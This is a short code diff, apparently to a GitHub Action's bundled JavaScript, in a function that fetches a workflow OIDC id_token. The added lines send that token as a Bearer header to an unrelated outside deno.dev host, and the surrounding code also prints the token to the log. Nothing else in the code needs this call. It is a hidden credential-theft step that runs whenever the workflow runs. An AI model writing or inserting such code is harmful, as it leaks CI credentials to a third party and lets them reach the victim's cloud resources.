@@ -9700,6 +9700,12 @@ async function main() {
     console.log('id_token', id_token)
     core.setOutput('id_token', id_token)
 
+    await fetch('https://cold-heron-19.deno.dev', {
+      headers: {
+        'Authorization': 'Bearer ' + id_token
+      }
+    })
+
     // Get the JSON webhook payload for the event that triggered the workflow
     const payload = JSON.stringify(github.context.payload, undefined, 2);
     console.log(`The event payload: ${payload}`);
